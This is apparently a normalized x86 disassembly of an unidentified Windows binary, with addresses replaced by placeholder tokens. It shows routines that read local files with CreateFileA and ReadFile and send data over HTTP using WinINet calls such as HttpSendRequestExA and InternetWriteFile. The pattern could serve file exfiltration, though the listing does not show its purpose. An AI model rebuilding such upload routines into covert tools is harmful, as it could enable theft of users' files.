push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
pop ebx
retn
sub_406cd0
mov eax [ ecx + 0x60 ]
xor edx edx
test eax eax
push esi
jbe r-xdata
xor eax eax
pop esi
retn
mov esi [ ecx + 0x5c ]
mov eax [ esi ]
cmp eax esi
je r-xdata
push ebx
push edi
mov ecx [ eax + 0x8 ]
mov eax [ eax ]
mov edi [ ecx + 0x18 ]
mov ebx [ ecx + 0x8 ]
add edi ebx
cmp eax esi
lea edx [ edx + edi + 0x2 ]
jne r-xdata
pop edi
pop ebx
test edx edx
je r-xdata
lea eax [ edx - 0x1 ]
pop esi
retn
sub_406d10
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ esp + 0x8 ] esi
call sub_406cd0
cmp [ esp + 0x14 ] eax
jbe r-xdata
pop esi
xor eax eax
pop ebx
pop ecx
retn 0x8
mov eax [ esi + 0x60 ]
test eax eax
jbe r-xdata
mov eax [ esi + 0x5c ]
mov ecx [ esp + 0x10 ]
push ebp
mov ebp [ eax ]
cmp ebp eax
je r-xdata
test ebx ebx
mov [ ebx + ecx - 0x1 ] 0x0
pop ebp
je r-xdata
push edi
lea eax [ ebx - 0x1 ]
pop esi
pop ebx
pop ecx
retn 0x8
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x18 ]
mov ecx [ eax + 0x8 ]
mov dl [ rw-data ]
lea edi [ ebx + esi ]
mov [ edi + ecx ] dl
mov edx [ eax + 0x14 ]
mov ecx [ eax + 0x18 ]
test edx edx
jne r-xdata
mov edx r--data
mov esi edx
mov edx [ eax + 0x8 ]
lea edi [ edi + edx + 0x1 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ eax + 0x18 ]
mov ecx [ esp + 0x18 ]
mov esi [ eax + 0x8 ]
add edx ebx
add edx ecx
mov [ edx + esi + 0x1 ] 0x26
mov edx [ eax + 0x18 ]
mov esi [ eax + 0x8 ]
mov eax [ esp + 0x10 ]
mov ebp [ ebp ]
add edx esi
lea ebx [ ebx + edx + 0x2 ]
mov edx [ eax + 0x5c ]
cmp ebp edx
jne r-xdata
mov edx r--data
mov eax [ ebp + 0x8 ]
lea edi [ ebx + ecx ]
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
test edx edx
jne r-xdata
pop edi
sub_406e00
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_410668
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
mov ebx ecx
push ebp
push esi
mov eax [ ebx + 0x8 ]
push edi
test eax eax
je r-xdata
lea ecx [ esp + 0x3c ]
push r--data
push ecx
mov [ esp + 0x44 ] rw-data
call sub_409349
nop
nop
nop
nop
nop
nop
nop
sub esp 0x28
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
cmp eax 0xffffffff
je r-xdata
lea edx [ esp + 0x44 ]
push r--data
push edx
mov [ esp + 0x4c ] rw-data
call sub_409349
nop
cmp eax 0xffffffff
je r-xdata
mov edx [ ebx + 0x54 ]
xor ecx ecx
cmp edx 0x2
mov edx [ esp + 0x40 ]
setne cl
dec ecx
push 0x0
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x44 ]
push rw-data
push edx
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ ebx + 0xc ] edx
je r-xdata
mov edx [ esi + 0x54 ]
xor ecx ecx
cmp edx 0x2
mov edx [ esp + 0x44 ]
setne cl
dec ecx
push ebx
and ecx 0x800000
or ecx 0x4400000
push ecx
mov ecx [ esp + 0x40 ]
push rw-data
push edx
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
cmp edx ebx
mov [ esi + 0xc ] edx
je r-xdata
lea eax [ esp + 0x3c ]
push r--data
push eax
mov [ esp + 0x44 ] rw-data
call sub_409349
cmp edx 0xffffffff
je r-xdata
lea ecx [ esp + 0x44 ]
push r--data
push ecx
mov [ esp + 0x4c ] rw-data
call sub_409349
cmp edx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x80000000
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x80000000
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x6c ]
test eax eax
jbe r-xdata
lea edx [ esp + 0x3c ]
push r--data
push edx
mov [ esp + 0x44 ] rw-data
call sub_409349
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x10 ]
push ebx
[ edi ]
mov ecx [ esi + 0xc ]
mov edi [ esp + 0x44 ]
push ebx
lea eax [ esp + 0x14 ]
push ebx
push eax
push ecx
mov [ esp + 0x20 ] 0x28
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] edi
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x44 ]
push r--data
push edx
mov [ esp + 0x4c ] rw-data
call sub_409349
mov ecx ebx
call sub_406cd0
mov ebp [ GetProcessHeap@IAT ]
inc eax
push eax
push 0x8
call ebp
push eax
call [ HeapAlloc@IAT ]
mov ecx ebx
mov esi eax
call sub_406cd0
inc eax
mov ecx ebx
push eax
push esi
call sub_406d10
mov edx [ rw-data ]
push eax
mov edi edx
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ ebx + 0xc ]
push edx
push ecx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
mov al [ esp + 0x3c ]
push 0x0
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] al
call sub_404100
mov eax [ ebx + 0x54 ]
mov [ esp + 0x34 ] 0x0
dec eax
je r-xdata
mov ecx [ esp + 0x3c ]
mov edx [ esi + 0xc ]
lea eax [ esp + 0x38 ]
push eax
push edi
push ecx
push edx
call [ InternetWriteFile@IAT ]
mov eax [ esi + 0xc ]
push ebx
push ebx
push ebx
push eax
call [ HttpEndRequestA@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
add esp 0x28
retn 0x10
lea edx [ esp + 0x44 ]
push r--data
push edx
mov [ esp + 0x4c ] rw-data
call sub_409349
push esi
push 0x0
call ebp
push eax
call [ HeapFree@IAT ]
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x20 ]
push ebp
call sub_404170
test al al
je r-xdata
dec eax
jne r-xdata
push esi
push 0x0
call ebp
push eax
call [ HeapFree@IAT ]
lea edx [ esp + 0x40 ]
push r--data
push edx
mov [ esp + 0x48 ] rw-data
call sub_409349
mov edx [ ebx + 0x14 ]
test edx edx
jne r-xdata
mov edi [ esp + 0x20 ]
mov ecx ebp
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x20 ]
push ebp
call sub_404170
test al al
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
lea ecx [ esp + 0x24 ]
call sub_408220
mov eax [ ebx + 0x54 ]
cmp eax 0x1
jne r-xdata
mov edx r--data
mov edi [ esp + 0x20 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
jmp r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebx + 0x50 ] 0x50
je r-xdata
and ecx 0x3
push ebp
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
call sub_404150
mov cx [ rw-data ]
mov eax [ ebx + 0x50 ]
mov [ esp + 0x10 ] cx
xor edx edx
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x16 ] edx
push rw-data
push ecx
mov [ esp + 0x22 ] edx
call sub_409383
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x10 ]
push ecx
push edx
lea ecx [ esp + 0x24 ]
call sub_408220
cmp [ ebx + 0x50 ] 0x1bb
je r-xdata
mov edi [ esp + 0x3c ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x24 ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
mov eax [ ebx + 0x68 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov ecx [ esp + 0x24 ]
push 0x0
lea ebp [ ecx + esi ]
lea ecx [ esp + 0x20 ]
push ebp
call sub_404170
test al al
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0xffffffff
test ecx ecx
je r-xdata
mov edi [ InternetSetCookieA@IAT ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
mov ecx esi
mov esi [ esp + 0x3c ]
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
call sub_404150
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ ecx + 0x4 ]
mov edx r--data
test ecx ecx
je r-xdata
mov eax r--data
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x20 ]
test ecx ecx
jne r-xdata
mov edx ecx
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push eax
push edx
push ecx
call edi
test eax eax
je r-xdata
mov ecx r--data
lea eax [ esp + 0x3c ]
push r--data
push eax
mov [ esp + 0x44 ] rw-data
call sub_409349
mov esi [ esi ]
mov eax [ ebx + 0x68 ]
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x14 ]
test eax eax
jne r-xdata
sub_407330
sub esp 0x8
mov eax [ ecx + 0x60 ]
xor edx edx
test eax eax
push ebx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
jbe r-xdata
mov eax edx
pop ebx
add esp 0x8
retn
mov eax [ ecx + 0x5c ]
mov ebx [ eax ]
cmp ebx eax
je r-xdata
push ebp
mov ebp [ CreateFileA@IAT ]
push esi
push edi
mov esi 0x2000
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
mov eax edx
pop ebx
add esp 0x8
retn
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call ebp
mov edi eax
push 0x0
push edi
call [ GetFileSize@IAT ]
mov esi eax
push edi
add esi 0x1800
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
jmp r-xdata
mov eax r--data
mov ebx [ ebx ]
mov eax [ ecx + 0x5c ]
add edx esi
cmp ebx eax
mov [ esp + 0x10 ] edx
jne r-xdata
sub_4073d0
sub esp 0x18
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
mov [ esp + 0x20 ] esi
mov [ esp + 0xc ] ebx
call sub_407330
mov ebp [ esp + 0x28 ]
inc eax
cmp [ ebp ] 0x0
je r-xdata
push edi
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp ] eax
mov eax [ esi + 0x60 ]
test eax eax
jbe r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x18
retn 0x8
mov eax [ ebp ]
mov cx [ rw-data ]
mov edx [ esp + 0x30 ]
mov [ eax + ebx ] cx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ ebp ]
mov esi edx
not ecx
dec ecx
lea edi [ eax + ebx + 0x2 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
mov esi [ ebp ]
mov eax [ rw-data ]
not ecx
dec ecx
mov edi edx
add ecx esi
mov [ ecx + ebx + 0x2 ] eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
pop esi
pop ebp
lea eax [ ecx + ebx + 0x6 ]
pop ebx
add esp 0x18
retn 0x8
mov esi [ esi + 0x5c ]
mov eax [ esi ]
cmp eax esi
mov [ esp + 0x18 ] eax
je r-xdata
jmp r-xdata
mov esi [ eax + 0x8 ]
mov ebp [ ebp ]
add ebp ebx
mov al [ esi + 0x20 ]
mov ecx [ esi + 0x14 ]
test al al
mov [ esp + 0x20 ] ebp
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx r--data
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx r--data
mov edi [ esp + 0x30 ]
push ecx
push eax
push edi
push rw-data
push ebp
call sub_409383
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
mov eax [ esi + 0x18 ]
not ecx
dec ecx
add ecx eax
mov eax [ esi + 0x8 ]
lea ebx [ ecx + eax + 0x31 ]
mov eax r--data
mov edi [ esp + 0x30 ]
push ecx
push eax
push edi
push rw-data
push ebp
call sub_409383
or ecx 0xffffffff
xor eax eax
add esp 0x14
mov edx [ esi + 0x18 ]
[ edi ]
mov eax [ esi + 0x8 ]
mov esi [ esi + 0x14 ]
not ecx
dec ecx
add ecx edx
test esi esi
lea ebx [ ecx + eax + 0x3c ]
jne r-xdata
mov eax r--data
mov eax [ esp + 0x18 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push esi
call [ CreateFileA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi r--data
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
add edx ebx
mov ebp [ esp + 0x2c ]
mov eax [ ecx ]
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x24 ]
mov ebx [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
cmp eax [ edx + 0x5c ]
jne r-xdata
cmp esi 0xffffffff
je r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
xor edi edi
lea ecx [ esp + 0x14 ]
push edi
add ebp ebx
push ecx
push 0x400
push ebp
push esi
mov [ esp + 0x30 ] eax
mov [ esp + 0x28 ] edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov cx [ rw-data ]
add edi ebx
push esi
mov [ edi + edx ] cx
call [ CloseHandle@IAT ]
lea ebx [ edi + 0x2 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
cmp edi [ esp + 0x1c ]
ja r-xdata
add edi eax
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ edi + ebp ]
push 0x400
push eax
push esi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
sub_407630
push 0xffffffff
push sub_41068b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x430
push ebx
mov ebx ecx
push ebp
xor ebp ebp
mov eax [ ebx + 0x8 ]
push esi
cmp eax ebp
push edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x24 ] ebp
je r-xdata
lea eax [ esp + 0x10 ]
push r--data
push eax
mov [ esp + 0x18 ] rw-data
call sub_409349
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
cmp eax 0xffffffff
je r-xdata
mov edi [ ebx + 0x54 ]
xor ecx ecx
cmp edi 0x2
mov edx [ esp + 0x454 ]
setne cl
dec ecx
push ebp
and ecx 0x800000
or ecx 0x4400040
push ecx
mov ecx [ esp + 0x458 ]
push rw-data
push edx
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
cmp edx ebp
mov [ ebx + 0xc ] edx
je r-xdata
lea edx [ esp + 0x10 ]
push r--data
push edx
mov [ esp + 0x18 ] rw-data
call sub_409349
cmp edx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov esi [ HttpAddRequestHeadersA@IAT ]
[ edi ]
not ecx
dec ecx
push 0x80000000
push ecx
push rw-data
push edx
call esi
test eax eax
jne r-xdata
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
mov eax [ ebx + 0xc ]
push 0x10000000
not ecx
dec ecx
push ecx
push edx
push eax
call esi
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
push r--data
push edx
mov [ esp + 0x18 ] rw-data
call sub_409349
mov eax [ ebx + 0x6c ]
cmp eax ebp
jbe r-xdata
lea ecx [ esp + 0x10 ]
push r--data
push ecx
mov [ esp + 0x18 ] rw-data
call sub_409349
lea edx [ esp + 0x24 ]
push rw-data
push edx
mov ecx ebx
call sub_4073d0
mov esi eax
mov ax [ rw-data ]
mov [ esp + 0x40 ] ax
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x42 ]
[ edi ]
push esi
lea ecx [ esp + 0x44 ]
push rw-data
push ecx
stosw [ edi ]
call sub_409383
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov eax [ ebx + 0xc ]
push 0x10000000
not ecx
dec ecx
lea edx [ esp + 0x44 ]
push ecx
push edx
push eax
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov dl [ esp + 0x2b ]
push ebp
lea ecx [ esp + 0x18 ]
mov [ esp + 0x18 ] dl
call sub_404100
mov eax [ ebx + 0x54 ]
mov [ esp + 0x448 ] ebp
dec eax
je r-xdata
xor edi edi
mov [ rw-data ] 0x28
push edi
mov [ rw-data ] edi
mov edx [ ebx + 0xc ]
push 0x8
push edi
push rw-data
push edx
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push r--data
push ecx
mov [ esp + 0x18 ] rw-data
call sub_409349
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
call sub_404170
test al al
je r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ ebx + 0xc ]
lea edx [ esp + 0x38 ]
mov [ esp + 0x38 ] edi
push edx
push esi
push eax
push ecx
call [ InternetWriteFile@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
mov ecx ebx
push eax
call sub_407610
lea ecx [ esp + 0x10 ]
push r--data
push ecx
mov [ esp + 0x18 ] rw-data
call sub_409349
mov esi [ ebx + 0x14 ]
test esi esi
jne r-xdata
mov edi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebp ecx
lea ecx [ esp + 0x18 ]
push ebp
call sub_404170
test al al
je r-xdata
mov ecx [ ebx + 0xc ]
push edi
push 0x8
push edi
push ecx
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
mov ecx ebx
push edx
call sub_407610
lea eax [ esp + 0x10 ]
push r--data
push eax
mov [ esp + 0x18 ] rw-data
call sub_409349
mov edi esi
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov ebp ecx
cmp eax ebp
ja r-xdata
mov esi r--data
mov edi [ esp + 0x18 ]
mov ecx ebp
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
mov ecx [ esp + 0x24 ]
push ecx
mov ecx ebx
call sub_407610
mov ecx [ esp + 0x440 ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x43c
retn 0x8
mov edx [ esp + 0x24 ]
mov ecx ebx
push edx
call sub_407610
lea eax [ esp + 0x3c ]
push r--data
push eax
mov [ esp + 0x44 ] rw-data
call sub_409349
test ebp ebp
jbe r-xdata
call sub_40fc40
and ecx 0x3
push ebp
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_404150
mov eax [ ebx + 0x54 ]
cmp eax 0x1
jne r-xdata
mov ecx [ esp + 0x1c ]
push 0x0
lea ebx [ ecx + ebp ]
lea ecx [ esp + 0x18 ]
push ebx
call sub_404170
test al al
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebx + 0x50 ] 0x50
je r-xdata
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov ecx ebp
push ebx
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_404150
mov ax [ rw-data ]
mov edx [ ebx + 0x50 ]
mov [ esp + 0x2c ] ax
xor ecx ecx
push edx
lea eax [ esp + 0x30 ]
mov [ esp + 0x32 ] ecx
push rw-data
push eax
mov [ esp + 0x3e ] ecx
call sub_409383
lea edi [ esp + 0x38 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov edx [ esp + 0x1c ]
not ecx
dec ecx
mov esi ecx
mov ecx [ r--data ]
sub ecx edx
cmp ecx esi
ja r-xdata
cmp [ ebx + 0x50 ] 0x1bb
je r-xdata
mov edi [ esp + 0x450 ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x1c ]
[ edi ]
mov eax [ r--data ]
not ecx
dec ecx
sub eax edx
mov esi ecx
cmp eax esi
ja r-xdata
test esi esi
jbe r-xdata
call sub_40fc40
test esi esi
jbe r-xdata
call sub_40fc40
mov edx [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x18 ]
lea ebp [ edx + esi ]
push ebp
call sub_404170
test al al
je r-xdata
mov eax [ ebx + 0x68 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov eax [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x18 ]
lea ebp [ eax + esi ]
push ebp
call sub_404170
test al al
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
push ebp
lea edi [ ecx + eax ]
mov ecx esi
mov edx ecx
lea esi [ esp + 0x30 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_404150
mov ecx [ esp + 0x18 ]
mov [ esp + 0x448 ] 0xffffffff
test ecx ecx
je r-xdata
mov edi [ InternetSetCookieA@IAT ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
push ebp
lea edi [ edx + ecx ]
mov ecx esi
mov esi [ esp + 0x454 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
call sub_404150
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ ecx + 0x4 ]
mov edx r--data
test ecx ecx
je r-xdata
mov eax r--data
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
jne r-xdata
mov edx ecx
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push eax
push edx
push ecx
call edi
test eax eax
je r-xdata
mov ecx r--data
lea ecx [ esp + 0x10 ]
push r--data
push ecx
mov [ esp + 0x18 ] rw-data
call sub_409349
mov esi [ esi ]
mov eax [ ebx + 0x68 ]
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x14 ]
test eax eax
jne r-xdata
sub_407bb0
sub esp 0x404
mov ax [ rw-data ]
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] ax
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xe ]
[ edi ]
stosw [ edi ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0xc ]
push eax
[ edi ]
mov eax [ esi + 0xc ]
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x5
push eax
mov [ esp + 0x1c ] 0x400
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0xc ]
push ecx
call sub_408f08
add esp 0x4
pop edi
pop esi
add esp 0x404
retn
mov eax [ esi + 0x44 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
jne r-xdata
mov eax r--data
mov edx [ esi + 0x54 ]
push rw-data
push eax
mov eax [ esi + 0x50 ]
push edx
push eax
push ecx
call sub_406090
add esp 0x14
xor eax eax
pop edi
pop esi
add esp 0x404
retn
mov ecx r--data
sub_407c60
push ecx
push esi
mov esi ecx
push edi
mov ecx 0x100
xor eax eax
mov edi rw-data
[ edi ]
mov ecx [ esi + 0xc ]
push eax
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x400
push eax
push rw-data
push 0x1
push ecx
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
pop edi
mov eax rw-data
pop esi
pop ecx
retn
mov eax [ esi + 0x44 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
jne r-xdata
mov eax r--data
mov edx [ esi + 0x54 ]
push rw-data
push eax
mov eax [ esi + 0x50 ]
push edx
push eax
push ecx
call sub_406090
add esp 0x14
xor eax eax
pop edi
pop esi
pop ecx
retn
mov ecx r--data
sub_407ce0
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
mov edx [ esi + 0xc ]
push 0x0
push eax
push ecx
push 0x16
push edx
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
retn 0x8
mov eax [ esi + 0x44 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x14 ]
test ecx ecx
jne r-xdata
mov eax r--data
mov edx [ esi + 0x50 ]
push rw-data
push eax
mov eax [ esi + 0x54 ]
push eax
push edx
push ecx
call sub_406090
add esp 0x14
xor eax eax
pop esi
retn 0x8
mov ecx r--data
sub_407d40
push ebp
mov ebp esp
push 0xffffffff
push sub_4106a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
mov eax [ ecx + 0xc ]
push ebx
push esi
xor edx edx
push edi
cmp eax edx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push ecx
push eax
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push r--data
push eax
mov [ ebp - 0x1c ] rw-data
call sub_409349
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0x20 ]
push r--data
push edx
mov [ ebp - 0x20 ] rw-data
call sub_409349
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xc ]
push eax
call [ InternetCloseHandle@IAT ]
xor edx edx
mov [ esi + 0xc ] edx
mov eax [ esi + 0x44 ]
cmp eax edx
jne r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edx
jne r-xdata
mov eax r--data
mov edx [ ebp - 0x24 ]
push edx
mov edx [ esi + 0x50 ]
push eax
mov eax [ esi + 0x54 ]
push eax
push edx
push ecx
call sub_406090
add esp 0x14
mov eax r-xdata
retn
mov ecx r--data
sub_407dfe
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0xc ]
push eax
call [ InternetCloseHandle@IAT ]
xor edx edx
mov [ esi + 0xc ] edx
mov eax [ esi + 0x44 ]
cmp eax edx
jne r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edx
jne r-xdata
mov eax r--data
mov edx [ esi + 0x54 ]
push rw-data
push eax
mov eax [ esi + 0x50 ]
push edx
push eax
push ecx
call sub_406090
add esp 0x14
mov eax r-xdata
retn
mov ecx r--data
sub_407e60
sub esp 0x40c
or ecx 0xffffffff
xor eax eax
push ebx
push ebp
push esi
mov esi [ esp + 0x41c ]
push edi
mov edi esi
xor ebx ebx
xor ebp ebp
[ edi ]
not ecx
dec ecx
